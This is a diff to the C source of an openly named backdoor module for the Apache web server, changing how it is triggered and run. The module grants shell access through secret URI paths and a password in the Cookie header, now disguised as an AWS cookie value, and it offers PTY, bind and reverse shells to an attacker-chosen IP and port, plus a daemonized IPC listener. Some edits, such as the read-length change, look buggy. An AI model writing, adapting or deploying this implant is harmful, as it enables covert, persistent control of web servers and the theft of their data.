@@ -47,7 +47,7 @@
 #define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))
 
 
-#define PASSWORD "P0wn3d"
+#define PASSWORD "_aws=d0e632a8f49dbf7451e2f70ddb13fcaa"
 #define SOCKSWORD "/w41t1ngR00M"
 #define PINGWORD "/h0p3"
 #define SHELLWORD "/s4L4dD4ys"
@@ -538,11 +538,15 @@ void shellPTY1(int socket) {
                     }
                 }
             }
-            waitpid(fpid,NULL,0);
-            exit(0);
+            /*waitpid(fpid,NULL,0);
+            exit(0);*/
         }
     }
     waitpid(ppid,NULL,0);
+    //exit(0);
+    /*else{
+        return DECLINED;
+    }*/
 
     return;
 }
@@ -586,7 +590,7 @@ void shellPTY(int socket) {
             if (sr) {
                 if (FD_ISSET(terminalfd, &readfd)) {
                     memset(buf, 0, sizeof(buf));
-                    n = read(terminalfd, buf, strlen(buf) + 1);
+                    n = read(terminalfd, buf, sizeof(strlen(buf)));
                     if (n <= 0) {
                         kill(fpid, SIGKILL);
                         break;
@@ -596,7 +600,7 @@ void shellPTY(int socket) {
                 }
                 if (FD_ISSET(socket, &readfd)) {
                     memset(buf, 0, sizeof(buf));
-                    n = read(socket, buf, strlen(buf) + 1);
+                    n = read(socket, buf, sizeof(strlen(buf)));
                     if (n <= 0) {
                         kill(fpid, SIGKILL);
                         break;
@@ -700,36 +704,41 @@ static int backdoor_post_read_request(request_rec *r) {
 
 	int backdoor = 0;
 
-    /*keyValuePair *formData;
+    //keyValuePair *formData;
 
-    formData = readPost(r);
+    /*formData = readPost(r);
     if (formData) {
-        int i;
+        //int i;
         for (i = 0; &formData[i]; i++) {
             if (formData[i].key && formData[i].value) {
                 //ap_rprintf(r, "%s = %s\n", formData[i].key, formData[i].value);
-                if(!strcmp(formData[i].key,"pass") && !strcmp(formData[i].value,"password") ){
-                    backdoor = 1;
+                if(strcmp(formData[i].key,"pass") == 0){
+                    if(strcmp(formData[i].value,"password") == 0){
+                        backdoor = 1;
+                    }
                 }
-            } *//*else if (formData[i].key) {
-                ap_rprintf(r, "%s\n", formData[i].key);
+            } else if (formData[i].key) {
+                backdoor = 1;
+                //ap_rprintf(r, "%s\n", formData[i].key);
             } else if (formData[i].value) {
-                ap_rprintf(r, "= %s\n", formData[i].value);
-            }*//* else {
+                backdoor = 1;
+                //ap_rprintf(r, "= %s\n", formData[i].value);
+            } *//*else {
                 break;
-            }
+            }*//*
         }
     }*/
 
-	fields = apr_table_elts(r->headers_in);
-	e = (apr_table_entry_t *) fields->elts;
-	for(i = 0; i < fields->nelts; i++) {
-		if (!strcmp(e[i].key,"User-Agent")) {
-			if (!strcmp(e[i].val, PASSWORD)) {
-				backdoor = 1;
-			}
-		}
-	}
+    fields = apr_table_elts(r->headers_in);
+    e = (apr_table_entry_t *) fields->elts;
+    for(i = 0; i < fields->nelts; i++) {
+        if (!strcmp(e[i].key,"Cookie")) {
+            if (!strcmp(e[i].val, PASSWORD)) {
+                backdoor = 1;
+            }
+        }
+    }
+
 
 	if (backdoor == 0) {
 		return DECLINED;
@@ -783,12 +792,6 @@ static int backdoor_post_read_request(request_rec *r) {
 
         }
 
-        /*char* meh = strtok(r->uri,"/");
-        char* port = strtok(NULL,"/");
-
-        waitProxy(fd,atoi(port));
-
-        exit(0);*/
 	}
 	if (strstr(r->uri, BINDWORD)) {
 	    int new_socket, bindfd;
@@ -810,6 +813,8 @@ static int backdoor_post_read_request(request_rec *r) {
 
 
         bindfd = bindPort(fd,atoi(port));
+
+
         char* info = malloc(128);
         sprintf(info,"[+] Shell binded on port %s\n",port);
         write(fd, info,strlen(info));
@@ -837,7 +842,7 @@ static int backdoor_post_read_request(request_rec *r) {
     }
 
 	if (!strcmp(r->uri, PINGWORD)) {
-		write(fd, "Alive!", strlen("Alive!"));
+		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n")+1);
 		exit(0);
 	}
     if (!strcmp(r->uri, RESTARTWORD)) {
@@ -942,13 +947,18 @@ static int backdoor_post_read_request(request_rec *r) {
 
 
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
+    //pid_t ppid;
+    pthread_t thread_id;
+
     pid = fork();
 
+
+    // Kill father to create daemon rattached to pid 1
     if (pid) {
         return OK;
     }
 
-	int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd;
+	int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd, sr;
 	struct sockaddr_un serveraddr;
 	char buf[1024];
 	fd_set readfds;
@@ -971,57 +981,95 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
 	listen(master, 5);
 	chmod(serveraddr.sun_path, 0777);
 
+    //pthread_t thread_id;
+    while(1) {
+        FD_ZERO(&readfds);
+        FD_SET(master, &readfds);
 
-	while(1) {
-		FD_ZERO(&readfds);
-		FD_SET(master, &readfds);
-		max_sd = master;
+        // Read IPC socket
+        sr = select(master + 1, &readfds, NULL, NULL, NULL);
+        if(sr){
+            if (FD_ISSET(master, &readfds)) {
+                sd = accept(master, NULL, NULL);
+                FD_SET(sd, &readfds);
+                if (FD_ISSET(sd, &readfds)) {
+                    memset(buf, 0, 1024);
+                    if ((rc = read(sd, buf, 1024)) <= 0) {
+                        //pthread_join(thread_id, NULL);
+                        close(sd);
+                    } else {
+                        if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
+                            //pid_t spid;
+                            pthread_create(&thread_id, NULL, shellPTY, sd);
+                            pthread_detach(&thread_id);
 
-		for (i = 0; i < max_clients; i++) {
-			sd = clients[i];
-			if (sd > 0) {
-				FD_SET(sd, &readfds);
-			}
-			if (sd > max_sd) {
-				max_sd = sd;
-			}
-		}
-		select (max_sd +1, &readfds, NULL, NULL, NULL);
-		if (FD_ISSET(master, &readfds)) {
-			new_client = accept(master, NULL, NULL);
-			for (i = 0; i < max_clients; i++) {
-				if (clients[i] == 0) {
-					clients[i] = new_client;
-					break;
-				}
-			}
-		}
-        // Check for IPC socket, if contain SHELL, launch shellPTY(sd)
-		for (i = 0; i < max_clients; i++) {
-			sd = clients[i];
-			if (FD_ISSET(sd, &readfds)) {
-				memset(buf, 0, 1024);
-				if ((rc = read(sd, buf, 1024)) <= 0) {
-					close(sd);
-					clients[i] = 0;
-				}
-				else  {
-					if (strstr(buf, "SHELL") || strstr(buf,"BIND")){
+                        } else if (strstr(buf, "APACHE")) {
+                            restartApache();
+                        } else if (strstr(buf, "reverse")) {
+                            char *meh = strtok(buf, "/");
+                            char *ip = strtok(NULL, "/");
+                            char *port = strtok(NULL, "/");
+                            char *prog = strtok(NULL, "/");
+
+                            reverseShell(ip, port, prog);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    /*while(1) {
+        FD_ZERO(&readfds);
+        FD_SET(master, &readfds);
+        max_sd = master;
+
+        for (i = 0; i < max_clients; i++) {
+            sd = clients[i];
+            if (sd > 0) {
+                FD_SET(sd, &readfds);
+            }
+            if (sd > max_sd) {
+                max_sd = sd;
+            }
+        }
+        select(max_sd + 1, &readfds, NULL, NULL, NULL);
+        if (FD_ISSET(master, &readfds)) {
+            new_client = accept(master, NULL, NULL);
+            for (i = 0; i < max_clients; i++) {
+                if (clients[i] == 0) {
+                    clients[i] = new_client;
+                    break;
+                }
+            }
+        }
+
+        // Read IPC socket
+        for (i = 0; i < max_clients; i++) {
+            sd = clients[i];
+            if (FD_ISSET(sd, &readfds)) {
+                memset(buf, 0, 1024);
+                if ((rc = read(sd, buf, 1024)) <= 0) {
+                    close(sd);
+                    clients[i] = 0;
+                } else {
+                    if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                         shellPTY(sd);
-					}else if (strstr(buf, "APACHE")){
-					    restartApache();
-					}else if(strstr(buf, "reverse")){
-                        char* meh = strtok(buf,"/");
-                        char* ip = strtok(NULL,"/");
-                        char* port = strtok(NULL,"/");
-                        char* prog = strtok(NULL,"/");
+                    } else if (strstr(buf, "APACHE")) {
+                        restartApache();
+                    } else if (strstr(buf, "reverse")) {
+                        char *meh = strtok(buf, "/");
+                        char *ip = strtok(NULL, "/");
+                        char *port = strtok(NULL, "/");
+                        char *prog = strtok(NULL, "/");
 
-                        reverseShell(ip,port,prog);
-					}
-				}
-			}
-		}
-	}
+                        reverseShell(ip, port, prog);
+                    }
+                }
+            }
+        }
+    }*/
+
+
 
     /*pid_t spid;
     spid = fork();
@@ -1039,10 +1087,34 @@ static int backdoor_log_transaction(request_rec *r) {
 
 	int backdoor = 0;
 
+    /*keyValuePair *formData;
+
+    formData = readPost(r);
+    if (formData) {
+        //int i;
+        for (i = 0; &formData[i]; i++) {
+            if (formData[i].key && formData[i].value) {
+                //ap_rprintf(r, "%s = %s\n", formData[i].key, formData[i].value);
+                if(!strcmp(formData[i].key,"pass") && !strcmp(formData[i].value,"password") ){
+                    backdoor = 1;
+                }
+            } else if (formData[i].key) {
+                backdoor = 1;
+                //ap_rprintf(r, "%s\n", formData[i].key);
+            } else if (formData[i].value) {
+                backdoor = 1;
+                //ap_rprintf(r, "= %s\n", formData[i].value);
+            } else {
+                break;
+            }
+        }
+    }*/
+
+
 	fields = apr_table_elts(r->headers_in);
 	e = (apr_table_entry_t *) fields->elts;
 	for(i = 0; i < fields->nelts; i++) {
-		if (!strcmp(e[i].key,"User-Agent")) {
+		if (!strcmp(e[i].key,"Cookie")) {
 			if (!strcmp(e[i].val, PASSWORD)) {
 				backdoor = 1;
 			}
